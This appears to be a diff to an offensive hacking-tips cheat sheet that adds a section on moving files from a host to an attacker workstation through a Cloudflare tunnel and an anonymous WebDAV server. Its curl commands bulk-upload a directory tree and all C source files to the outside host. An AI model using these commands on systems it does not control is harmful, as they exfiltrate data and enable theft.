@@ -35,6 +35,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
+   1. [File transfer using WebDAV](#webdav)
 1. [Reverse Shell / Dumb Shell](#reverse-shell)
    1. [Reverse Shells](#reverse-shell)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
@@ -776,7 +777,44 @@ python -m http.server 8080
 
 ```sh
 ## Request a temporary tunnel on a public domain
-cloudflared tunnel -url 127.0.0.1:8080
+cloudflared tunnel -url localhost:8080
+```
+
+<a id="http"></a>
+
+### 4.iv. File transfer - using WebDAV
+
+On your workstation (e.g. segfault.net) start a WebDAV server via Cloudflared:
+```sh
+cloudflared tunnel --url localhost:8080 &
+# [...]
+# +--------------------------------------------------------------------------------------------+
+# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
+# |  https://example-foo-bar-lights.trycloudflare.com                     |
+# +--------------------------------------------------------------------------------------------+
+# [...]
+wsgidav --port=8080 --root=.  --auth=anonymous
+```
+
+Upload to your workstation:
+```sh
+curl -T file.dat https://structured-foo-bar-lights.trycloudflare.com
+# Or create a directory remotely
+curl -X MKCOL https://structured-foo-bar-lights.trycloudflare.com/sources
+# Create a directory hirachy remotely
+find . -type d | xargs -P10 -I{} curl -X MKCOL https://example-foo-bar-lights.trycloudflare.com/sources/{}
+# And upload all *.c files (in parallel):
+find . -name '*.c' | xargs -P10 -I{} curl -T{} https://example-foo-bar-lights.trycloudflare.com/sources/{}
+```
+
+Access the share from Windows (to drag & drop files) in File Explorer:
+```
+\\example-foo-bar-lights.trycloudflare.com@SSL\sources
+```
+
+Or mount the WebDAV share on Windows:
+```
+net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
 ---
